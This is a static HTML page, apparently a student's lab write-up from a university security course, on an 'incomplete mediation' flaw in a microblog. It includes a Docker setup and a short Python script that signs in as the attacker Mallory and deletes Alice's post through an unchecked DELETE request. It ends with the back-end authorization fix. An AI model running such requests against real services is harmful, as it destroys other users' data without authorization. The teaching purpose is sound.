@@ -1,0 +1,305 @@
+<!DOCTYPE html>
+<html style="height: 100%;" lang="en">
+  <head>
+    <title>reo</title>
+<meta name="description" content="Leop homepage">
+
+<meta property="og:title" content="reo">
+<meta property="og:description" content="Leop homepage">
+
+<!-- <meta property="fb:app_id" content="260132667518211"> -->
+<!-- <link rel="apple-touch-icon" href="https://aidn.jp/apple-touch-icon.png"> -->
+<!-- <link rel="shortcut icon" href="https://aidn.jp/shared/icon/favicon.ico"> -->
+<!-- <link rel="alternate" media="handheld" href="https://aidn.jp/"> -->
+<!--
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://aidn.jp/shared/img/og/aidn.png">
+<meta name="twitter:site" content="@daniwell_aidn">
+
+<meta property="og:image" content="https://aidn.jp/shared/img/og/aidn.png">
+
+
+<link href='https://fonts.googleapis.com/css?family=PT+Sans:400,700,400italic,700italic|Source+Sans+Pro:400,700,200,300|Josefin+Sans:400,600,700,300' rel='stylesheet' type='text/css'>
+<link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet">
+
+<link rel="canonical" href="http://192.168.0.23:4000/">
+<link rel="alternate" type="application/rss+xml" title="Reo homepage" href="http://192.168.0.23:4000/feed.xml">
+-->
+
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<meta charset="utf-8">
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=1">
+<meta property="og:locale" content="en_CA">
+<meta property="og:type" content="website">
+
+<meta name="theme-color" content="#000">
+<link rel="stylesheet" href="/assets/css/style.css">
+
+
+
+
+  </head>
+  <body style="position: relative; min-height: 100%; top: 0px;" class="dark ">
+    <nav id="nav_hp" class="sidenav collapse invert-color">
+  <!-- close button div
+  <div id="menu" style="display:block; width:100%">
+    <a href="javascript:void(0)" class="closebtn hide-large"
+				 style="line-height: 0.35; font-size:5.5vmax; margin-left:calc(6rem + 20vmin - 13vmax)"
+				 onclick="close_nav()">&times;</a>
+  </div>
+  -->
+  <!-- items div -->
+  <div id="menu" class="sidenav-items" style="display:block; width:100%">
+  
+  <p><a href="/" >TOP</a></p>
+  
+  <p><a href="/about.html" >ABOUT</a></p>
+  
+  <p><a href="/blog.html" >BLOG</a></p>
+  
+  </div>
+</nav>
+<div class="overlay hide-large" onclick="close_nav()" style="cursor:pointer"
+				title="close side menu" id="overlay"></div>
+<span class="hide-large" style="font-size:30px; cursor:pointer; position:fixed; top:3vh; left:1.2vw" onclick="open_nav()">&#9776;</span>
+<script>
+	// Open and close sidebar
+	function open_nav() {
+		document.getElementById("nav_hp").style.width = "calc(6rem + 20vmin)";
+		document.getElementById("overlay").style.display = "block";
+	}
+	function close_nav() {
+		document.getElementById("nav_hp").style.width = "0px";
+		document.getElementById("overlay").style.display = "none";
+	}
+</script>
+<!--
+	<p><a href="http://192.168.0.52:4000">TOP</a></p>
+
+	
+	
+	
+	
+	
+	
+	
+	
+	
+-->
+
+    <div class="hp-contents">
+      <h2 class="title">Incomplete Mediation</h2>
+      <div class="-container">
+        <div class="-content focus-content">
+
+          <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <div class="post-content" itemprop="articleBody">
+    <p>This is an attack which is easily exploited
+if the backend does not properly check the authenticated user
+before performing an action.</p>
+
+<h2 class="no_toc" id="contents">Contents</h2>
+
+<ul id="markdown-toc">
+  <li><a href="#setup" id="markdown-toc-setup">Setup</a></li>
+  <li><a href="#observations" id="markdown-toc-observations">Observations</a></li>
+  <li><a href="#the-attack" id="markdown-toc-the-attack">The Attack</a></li>
+  <li><a href="#conclusion" id="markdown-toc-conclusion">Conclusion</a>    <ul>
+      <li><a href="#credits" id="markdown-toc-credits">Credits</a></li>
+    </ul>
+  </li>
+</ul>
+
+<p><br /></p>
+
+<hr />
+
+<h2 id="setup">Setup</h2>
+
+<hr />
+
+<p>We require only the service vulnerable to this attack <strong>microblog</strong>, the target <strong>Alice</strong> and
+the attacker <strong>Mallory</strong></p>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">version</span><span class="pi">:</span> <span class="s1">'</span><span class="s">3'</span>
+
+<span class="na">services</span><span class="pi">:</span>
+  <span class="na">microblog</span><span class="pi">:</span>
+    <span class="na">image</span><span class="pi">:</span> <span class="c1"># private image</span>
+    <span class="na">container_name</span><span class="pi">:</span> <span class="s">microblog</span>
+    <span class="na">ports</span><span class="pi">:</span>
+      <span class="pi">-</span> <span class="s2">"</span><span class="s">8080:80"</span>
+    <span class="na">networks</span><span class="pi">:</span>
+      <span class="na">channel</span><span class="pi">:</span>
+        <span class="na">ipv4_address</span><span class="pi">:</span> <span class="s">10.0.0.2</span>
+        
+  <span class="na">alice</span><span class="pi">:</span>
+    <span class="na">image</span><span class="pi">:</span> <span class="c1"># private image</span>
+    <span class="na">container_name</span><span class="pi">:</span> <span class="s">alice</span>
+    <span class="na">tty</span><span class="pi">:</span> <span class="no">true</span>
+    <span class="na">shm_size</span><span class="pi">:</span> <span class="s1">'</span><span class="s">1gb'</span>
+    <span class="na">sysctls</span><span class="pi">:</span>
+        <span class="pi">-</span> <span class="s">net.ipv6.conf.all.disable_ipv6=1</span>
+    <span class="na">networks</span><span class="pi">:</span>
+      <span class="na">channel</span><span class="pi">:</span>
+        <span class="na">ipv4_address</span><span class="pi">:</span> <span class="s">10.0.0.3</span>
+        
+  <span class="na">mallory</span><span class="pi">:</span>
+      <span class="na">image</span><span class="pi">:</span> <span class="c1"># private image</span>
+      <span class="na">container_name</span><span class="pi">:</span> <span class="s">mallory</span>
+      <span class="na">tty</span><span class="pi">:</span> <span class="no">true</span>
+      <span class="na">restart</span><span class="pi">:</span> <span class="s">always</span>
+      <span class="na">volumes</span><span class="pi">:</span>
+          <span class="pi">-</span> <span class="s">.:/shared</span>
+      <span class="na">network_mode</span><span class="pi">:</span> <span class="s">service:microblog</span>
+      
+  <span class="na">wireshark</span><span class="pi">:</span>
+    <span class="na">image</span><span class="pi">:</span> <span class="c1"># private image</span>
+    <span class="na">container_name</span><span class="pi">:</span> <span class="s">wireshark</span>
+    <span class="na">tty</span><span class="pi">:</span> <span class="no">true</span>
+    <span class="na">network_mode</span><span class="pi">:</span> <span class="s">service:microblog</span>
+
+<span class="na">networks</span><span class="pi">:</span>
+  <span class="na">channel</span><span class="pi">:</span>
+    <span class="na">driver</span><span class="pi">:</span> <span class="s">bridge</span>
+    <span class="na">ipam</span><span class="pi">:</span>
+      <span class="na">config</span><span class="pi">:</span>
+        <span class="pi">-</span> <span class="na">subnet</span><span class="pi">:</span> <span class="s">10.0.0.0/24</span>
+</code></pre></div></div>
+
+<p>We start the containers with <code class="language-plaintext highlighter-rouge">$ docker-compose up</code> and open a browser to <code class="language-plaintext highlighter-rouge">http://localhost:8080/</code>.</p>
+
+<p>Upon the webapp starting, Alice populates it with a post: <em>Mallory should not be trusted</em>.</p>
+
+<p><br /></p>
+
+<hr />
+
+<h2 id="observations">Observations</h2>
+
+<hr />
+
+<p>We can use Wireshark or simply the developer’s console in our browser to see the messages being sent.</p>
+
+<!--IMAGE OF DEV CONSOLE!-->
+
+<p>The following table is how each operation is sent to the server</p>
+
+<div class="xscrollable">
+<table>
+<thead>
+  <tr>
+    <th>User Action</th>
+    <th>Path</th>
+    <th>HTTP method</th>
+    <th>Form Data</th>
+  </tr>
+</thead>
+<tbody>
+  <tr>
+    <td>Sign-in</td>
+    <td>/signin.php</td>
+    <td>POST</td>
+    <td>email, password</td>
+  </tr>
+  <tr>
+    <td>Post message</td>
+    <td>/post.php</td>
+    <td>POST</td>
+    <td>msg</td>
+  </tr>
+  <tr>
+    <td>Delete message</td>
+    <td>/delete.php</td>
+    <td>DELETE</td>
+    <td>id</td>
+  </tr>
+</tbody>
+</table>
+</div>
+
+<p><br /></p>
+
+<hr />
+
+<h2 id="the-attack">The Attack</h2>
+
+<hr />
+
+<p>For this lab, we will have Mallory delete a post made by Alice
+despite the fact that the front-end UI doesn’t allow them to.</p>
+
+<p>Since there is no back end authentication for which account is performing
+the action, mallory simply needs to sign in and make the appropriate request.
+Using our table, we see what the server expects from a legitimate deletion.
+We can then automate the process</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">os</span><span class="p">,</span> <span class="n">requests</span>
+<span class="kn">from</span> <span class="nn">urllib.parse</span> <span class="kn">import</span> <span class="n">urlencode</span>
+
+<span class="n">PROTOCOL</span> <span class="o">=</span> <span class="s">"http"</span>
+<span class="n">HOST</span> <span class="o">=</span> <span class="s">"10.0.0.2"</span>
+<span class="n">PORT</span> <span class="o">=</span> <span class="s">"80"</span>
+<span class="n">BASE</span> <span class="o">=</span> <span class="n">PROTOCOL</span> <span class="o">+</span> <span class="s">"://"</span> <span class="o">+</span> <span class="n">HOST</span> <span class="o">+</span> <span class="s">":"</span> <span class="o">+</span> <span class="n">PORT</span>
+
+<span class="c1"># Mallory's credentials
+</span><span class="n">mallory</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="s">'email'</span><span class="p">:</span> <span class="s">'mallory@example.com'</span><span class="p">,</span>
+    <span class="s">'password'</span><span class="p">:</span> <span class="s">'pass4mallory'</span>
+<span class="p">}</span>
+
+<span class="c1"># start a session
+</span><span class="k">with</span> <span class="n">requests</span><span class="p">.</span><span class="n">Session</span><span class="p">()</span> <span class="k">as</span> <span class="n">s</span><span class="p">:</span>
+     <span class="c1"># sign-in as mallory (POST request)
+</span>     <span class="n">res</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">BASE</span> <span class="o">+</span> <span class="s">'/signin.php'</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">mallory</span><span class="p">)</span>
+     <span class="c1"># delete Alice's message (DELETE request)
+</span>     <span class="n">res</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">delete</span><span class="p">(</span><span class="n">BASE</span> <span class="o">+</span> <span class="s">'/delete.php'</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s">'id'</span><span class="p">:</span> <span class="s">'3'</span><span class="p">})</span>
+</code></pre></div></div>
+
+<p><br /></p>
+
+<hr />
+
+<h2 id="conclusion">Conclusion</h2>
+
+<hr />
+
+<p>Running our script, we see that Alice’s first message has been deleted as expected
+despite the fact that Mallory should not have these permissions.
+This can be solved quite easily by authenticating the the correct user is in fact logged
+in in the back end. A rule of thumb is that the front-end should not be trusted since
+it is user-controlled.</p>
+
+<p>When you’re done, don’t forget to <a href="/crypto/2020/10/08/05-lab.html#docker-cleanup">clean up</a>
+after Docker.</p>
+
+<hr />
+
+<h3 id="credits">Credits</h3>
+
+<hr />
+
+<p>These labs and exercises were provided as a part of a course in Security
+taught in 2019 by
+<a href="https://thierrysans.me/">Thierry Sans</a>.
+Credit for creation of these exercises and
+Docker images/containers goes to their respective creators.</p>
+
+<p>Docker images, urls, etc. are kept private
+to prevent abuse but if interested please
+contact.</p>
+
+
+  </div>
+</article>
+
+
+        </div>
+      </div>
+    </div>
+  </body>
+</html>
